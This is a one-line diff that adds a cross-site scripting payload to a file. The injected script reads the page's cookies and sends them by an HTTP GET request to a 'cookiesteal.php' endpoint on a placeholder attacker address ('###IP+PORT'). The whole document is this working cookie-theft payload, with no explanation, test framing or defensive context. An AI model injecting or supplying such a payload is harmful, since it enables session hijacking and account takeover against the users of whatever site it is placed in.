@@ -1,0 +1,1 @@
+<script> var c=document.cookie; const Http = new XMLHttpRequest(); const url='http://###IP+PORT/cookiesteal.php?c='+c; Http.open("GET", url); Http.send();</script>
